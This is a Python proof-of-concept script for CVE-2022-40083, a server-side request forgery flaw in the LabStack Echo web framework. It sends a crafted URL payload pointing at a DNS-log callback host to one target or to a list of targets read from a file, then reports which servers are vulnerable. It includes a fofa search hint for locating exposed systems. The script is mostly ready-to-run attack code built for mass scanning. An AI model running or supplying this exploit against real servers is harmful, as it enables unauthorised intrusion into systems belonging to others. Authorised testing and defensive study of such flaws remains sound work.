#!/usr/bin/env python
# -*- conding:utf-8 -*-
# LabStack LLC echo SSRF漏洞
# fofa “Echo”
import requests
import argparse
import sys
import urllib3
import time
from termcolor import cprint
from dnslog import get_dnslog,get_data
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
  _____ __      __ ______          ___    ___   ___   ___           _  _     ___    ___    ___   ____  
 / ____|\ \    / /|  ____|        |__ \  / _ \ |__ \ |__ \         | || |   / _ \  / _ \  / _ \ |___ \ 
| |      \ \  / / | |__    ______    ) || | | |   ) |   ) | ______ | || |_ | | | || | | || (_) |  __) |
| |       \ \/ /  |  __|  |______|  / / | | | |  / /   / / |______||__   _|| | | || | | | > _ <  |__ < 
| |____    \  /   | |____          / /_ | |_| | / /_  / /_            | |  | |_| || |_| || (_) | ___) |
 \_____|    \/    |______|        |____| \___/ |____||____|           |_|   \___/  \___/  \___/ |____/ 
                                                                                                                                                                                                             
                                                                                                                                                                                                         
                                                                                        Author:Henry4E36
               """,color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        color = "red"
        dnslog = get_dnslog()
        payload = self.url + f"//{dnslog}%2f.."
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        }
        proxies = {
            "http": "127.0.0.1:8080"
        }
        
        try:
            res = requests.get(url=payload, headers=headers,verify=False, timeout=10)
        except Exception as e:
            pass
        time.sleep(5)
        data = get_data()
        if dnslog in data:
            print(f"\033[31m[{chr(8730)}] 目标系统: {self.url} 存在SSRF漏洞！\033[0m")
            print("[" + "-"*100 + "]")
        else:
            print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在SSRF漏洞！")
            print("[" + "-"*100 + "]")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='LabStack LLC echo SSRF漏洞')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 CVE-2022-40083.py -u http://127.0.0.1\neg2:>>>python3 CVE-2022-40083.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()